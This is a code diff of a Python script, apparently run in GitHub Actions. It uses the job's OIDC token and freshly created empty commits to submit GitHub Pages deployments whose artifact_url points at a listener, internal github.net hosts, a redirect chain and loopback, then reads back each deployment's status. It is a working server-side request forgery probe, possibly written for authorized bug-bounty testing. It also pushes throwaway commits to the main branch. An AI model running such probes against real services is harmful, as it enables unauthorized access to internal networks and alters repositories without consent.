@@ -1,69 +1,95 @@
-import hashlib, json, os, ssl, sys, time, urllib.request, urllib.error
+import json, os, ssl, sys, time, urllib.request, urllib.error
 RUN=os.environ.get("GITHUB_RUN_ID","0"); REPO=os.environ["GITHUB_REPOSITORY"]
 ART=os.environ.get("ART_ID","").strip(); GH=os.environ["GH_TOKEN"]
-SINK=os.environ.get("SINK","").rstrip("/"); API="https://api.github.com"
-def http(u,m="GET",b=None,h=None,t=30):
+SINK=os.environ.get("SINK","").rstrip("/"); SHA=os.environ["GITHUB_SHA"]; API="https://api.github.com"
+def http(u,m="GET",b=None,t=30):
     r=urllib.request.Request(u,method=m,data=json.dumps(b).encode() if b is not None else None)
-    for k,v in (h or {}).items(): r.add_header(k,v)
+    r.add_header("Authorization",f"Bearer {GH}"); r.add_header("Accept","application/vnd.github+json")
+    r.add_header("X-GitHub-Api-Version","2022-11-28")
     if b is not None: r.add_header("Content-Type","application/json")
     try:
         with urllib.request.urlopen(r,timeout=t,context=ssl.create_default_context()) as z:
             return z.status,z.read().decode("utf-8","replace")
     except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
     except Exception as e: return -1,f"<{type(e).__name__}:{e}>"
-GHH={"Authorization":f"Bearer {GH}","Accept":"application/vnd.github+json","X-GitHub-Api-Version":"2022-11-28"}
-def bv(tag): return hashlib.sha1(f"{RUN}-{tag}".encode()).hexdigest()   # distinct 40-hex per arm
+DEP=f"{API}/repos/{REPO}/pages/deployments"
 
-print("=== ARMS2-START ===",flush=True)
+def deploy(bver,url=None):
+    b={"pages_build_version":bver,"oidc_token":TOK,"artifact_id":int(ART)}
+    if url: b["artifact_url"]=url
+    s,body=http(DEP,"POST",b); did=None
+    try: did=json.loads(body).get("id")
+    except Exception: pass
+    return s,did," ".join(body.split())[:110]
+
+def mkcommit(tag):
+    """create a REAL empty commit so pages_build_version resolves; returns its sha"""
+    s,b=http(f"{API}/repos/{REPO}/git/ref/heads/main")
+    try: parent=json.loads(b)["object"]["sha"]
+    except Exception: return None,f"ref read {s}"
+    s,b=http(f"{API}/repos/{REPO}/git/commits/{parent}")
+    try: tree=json.loads(b)["tree"]["sha"]
+    except Exception: return None,f"commit read {s}"
+    s,b=http(f"{API}/repos/{REPO}/git/commits","POST",
+             {"message":f"sep-{tag}-{RUN}","tree":tree,"parents":[parent]})
+    try: new=json.loads(b)["sha"]
+    except Exception: return None,f"commit create {s} {b[:80]}"
+    s2,b2=http(f"{API}/repos/{REPO}/git/refs/heads/main","PATCH",{"sha":new,"force":False})
+    return new,f"create={s} advance_ref={s2}"
+
+print("=== ARMS3-START ===",flush=True)
+TOK=""
 try:
     idu=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); idt=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
-    s,b=http(idu,h={"Authorization":f"bearer {idt}"}); tok=""
-    try: tok=json.loads(b).get("value","") or ""
-    except Exception: pass
-    print(f"[oidc] HTTP {s} token_len={len(tok)}",flush=True)
-    if len(tok)<20 or not ART:
-        print("🔴 ARMING GATE FAILED (oidc or artifact-id absent). No verdict emitted.",flush=True); sys.exit(0)
-    print(f"[rig] artifact_id(this run)={ART}  run={RUN}",flush=True)
-    DEP=f"{API}/repos/{REPO}/pages/deployments"
+    s,b=http(idu) if False else (0,"")
+    r=urllib.request.Request(idu); r.add_header("Authorization",f"bearer {idt}")
+    with urllib.request.urlopen(r,timeout=30,context=ssl.create_default_context()) as z:
+        TOK=json.loads(z.read().decode()).get("value","") or ""
+    print(f"[oidc] token_len={len(TOK)}  artifact_id={ART}  sha={SHA[:12]}",flush=True)
+    if len(TOK)<20 or not ART:
+        print("🔴 ARMING GATE FAILED. No verdict emitted.",flush=True); sys.exit(0)
+
+    print("\n=== GATE 1: reproduce run-1's control (artifact_id only, the RUN'S OWN sha) ===",flush=True)
+    s1,d1,m1=deploy(SHA)
+    print(f"  G1 own-sha id-only -> {s1} dep={str(d1)[:14]} {m1}",flush=True)
+
+    print("\n=== GATE 2: is the constraint 'a REAL commit' or 'THIS run's commit'? ===",flush=True)
+    new,how=mkcommit("g2"); print(f"  made commit {str(new)[:14]} ({how})",flush=True)
+    s2,d2,m2=deploy(new) if new else (-1,None,"no commit")
+    print(f"  G2 new-real-sha id-only -> {s2} dep={str(d2)[:14]} {m2}",flush=True)
+    if not (200<=s1<300):
+        print("🔴 VOID: G1 failed, so run-1's control did not reproduce. Rig regression, measuring nothing.",flush=True); sys.exit(0)
+    if not (200<=s2<300):
+        print(f"◻ CONSTRAINT = THIS RUN'S COMMIT ONLY (G1 {s1} / G2 {s2}). A real-but-foreign commit is "
+              "refused, so N destinations need N RUNS with a push between them. Stopping: a matrix here "
+              "would collide on one object exactly like run 38692481202.",flush=True); sys.exit(0)
+    if d1==d2:
+        print("🔴 VOID: G1 and G2 returned the SAME deployment id, so build_version does not separate objects.",flush=True); sys.exit(0)
+    print(f"✅ SEPARABLE BY REAL COMMITS: G1 dep={str(d1)[:14]} != G2 dep={str(d2)[:14]}",flush=True)
+
     GN="https://ssrf-target.iad.github.net"; GF="https://ssrf-target-qq7x4z.iad.github.net"
-    ARMS=[
-      ("P_idonly   id only (POSITIVE CONTROL)", None),
-      ("P_sink     public listener (FETCH PROOF)", f"{SINK}/B-sink-{RUN}"),
-      ("P_pub200   httpbin status/200",         "https://httpbin.org/status/200"),
-      ("P_pub404   httpbin status/404",         "https://httpbin.org/status/404"),
-      ("P_nx       public NXDOMAIN",            f"https://zzq7x4z-nx-{RUN}.example.com/z.tar"),
-      ("I_real     ghnet REAL name",            f"{GN}/z-{RUN}.tar"),
-      ("I_fake     ghnet INVENTED twin",        f"{GF}/z-{RUN}.tar"),
-      ("I_redir    redirect -> ghnet REAL",     f"https://httpbin.org/redirect-to?url={GN}/z-{RUN}.tar"),
-      ("L_loop     loopback :8080",             f"http://127.0.0.1:8080/z-{RUN}.tar"),
-    ]
+    DESTS=[("sink",f"{SINK}/C-sink-{RUN}"),("pub200","https://httpbin.org/status/200"),
+           ("pub404","https://httpbin.org/status/404"),("nx",f"https://zzq7x4z-nx-{RUN}.example.com/z.tar"),
+           ("ghreal",f"{GN}/z-{RUN}.tar"),("ghfake",f"{GF}/z-{RUN}.tar"),
+           ("ghredir",f"https://httpbin.org/redirect-to?url={GN}/z-{RUN}.tar"),
+           ("loop",f"http://127.0.0.1:8080/z-{RUN}.tar")]
     made={}
-    for label,url in ARMS:
-        tag=label.split()[0]
-        body={"pages_build_version":bv(tag),"oidc_token":tok,"artifact_id":int(ART)}
-        if url: body["artifact_url"]=url
-        s,b=http(DEP,"POST",body,GHH); did=None
-        try: did=json.loads(b).get("id")
-        except Exception: pass
+    print("\n=== THE SEPARABLE DESTINATION MATRIX ===",flush=True)
+    for tag,url in DESTS:
+        sha_t,how=mkcommit(tag)
+        if not sha_t: print(f"  {tag:<8} SKIP (commit failed: {how})",flush=True); continue
+        s,did,m=deploy(sha_t,url)
         if did: made[tag]=did
-        print(f"  {label:<42} -> {s}  dep={str(did)[:16]}  {' '.join(b.split())[:120]}",flush=True)
-        time.sleep(1.5)
-    # SEPARABILITY GATE -- the whole point of this run
-    print("\n=== SEPARABILITY GATE ===",flush=True)
-    uniq=len(set(made.values()))
-    print(f"  deployments created={len(made)}  distinct ids={uniq}",flush=True)
-    if len(made)<2 or uniq!=len(made):
-        print("🔴 VOID: ids are NOT distinct, so arms overwrote one object exactly as in run "
-              "38691699068. Nothing below is attributable per-destination.",flush=True)
-        sep=False
-    else:
-        print("✅ SEPARABLE: every arm owns its own deployment object; statuses are attributable.",flush=True)
-        sep=True
-    for wait in (15,40,75,120):
-        time.sleep(wait if wait==15 else 25 if wait==40 else 35 if wait==75 else 45)
-        print(f"  --- t+{wait}s  (separable={sep}) ---",flush=True)
+        print(f"  {tag:<8} -> {s} dep={str(did)[:14]} {m}",flush=True)
+        time.sleep(2)
+    print(f"\n  created={len(made)} distinct={len(set(made.values()))}",flush=True)
+    if len(made)<2 or len(set(made.values()))!=len(made):
+        print("🔴 VOID: ids not distinct.",flush=True); sys.exit(0)
+    for wait in (20,60,110):
+        time.sleep(20 if wait==20 else 40 if wait==60 else 50)
+        print(f"  --- t+{wait}s ---",flush=True)
         for tag,did in made.items():
-            s,b=http(f"{API}/repos/{REPO}/pages/deployments/{did}",h=GHH)
-            print(f"    {tag:<10} HTTP {s} {' '.join(b.split())[:150]}",flush=True)
+            s,b=http(f"{API}/repos/{REPO}/pages/deployments/{did}")
+            print(f"    {tag:<8} HTTP {s} {' '.join(b.split())[:120]}",flush=True)
 finally:
-    print("=== ARMS2-END ===",flush=True)
+    print("=== ARMS3-END ===",flush=True)
